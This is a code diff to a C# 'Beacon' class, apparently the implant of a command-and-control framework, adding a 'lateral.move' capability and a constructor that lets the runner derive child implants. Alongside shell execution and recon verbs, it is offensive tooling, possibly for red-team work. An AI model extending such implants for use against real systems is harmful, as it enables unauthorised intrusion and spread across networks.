@@ -29,13 +29,15 @@ internal sealed class Beacon
 {
     // The capability verbs the reference implant advertises at handshake
     // (architecture.md Sec 10). The teamserver gates dispatch on these: the core
-    // shell verb plus the three recon verbs the runner implements.
+    // shell verb, the three recon verbs the runner implements, and lateral.move
+    // so a dispatched lateral task reaches the child-derivation handler.
     private static readonly string[] Caps =
     {
         "shell.exec",
         "recon.portscan",
         "recon.hostenum",
         "recon.service",
+        "lateral.move",
     };
 
     private readonly string _beaconUrl;
@@ -52,6 +54,18 @@ internal sealed class Beacon
     public Beacon(string beaconUrl, string implantId, X509Certificate2 leaf, RSA privateKey,
         IReadOnlyList<X509Certificate2> cas, TimeSpan sleep, TimeSpan jitter, DateTimeOffset? killDate,
         TextWriter log)
+        : this(beaconUrl, implantId, leaf, privateKey, cas, sleep, jitter, killDate, enroll: null, log)
+    {
+    }
+
+    /// <summary>
+    /// Builds a Beacon whose lateral.move handler can derive a child using
+    /// <paramref name="enroll"/> (architecture.md Sec 10.1). A null bundle leaves
+    /// derivation disabled and the runner behaves as the simpler constructor.
+    /// </summary>
+    public Beacon(string beaconUrl, string implantId, X509Certificate2 leaf, RSA privateKey,
+        IReadOnlyList<X509Certificate2> cas, TimeSpan sleep, TimeSpan jitter, DateTimeOffset? killDate,
+        EnrollBundle? enroll, TextWriter log)
     {
         _beaconUrl = beaconUrl;
         _implantId = implantId;
@@ -61,7 +75,7 @@ internal sealed class Beacon
         _sleep = sleep;
         _jitter = jitter;
         _killDate = killDate;
-        _runner = new Runner();
+        _runner = enroll is null ? new Runner() : new Runner(enroll);
         _log = log;
     }
 
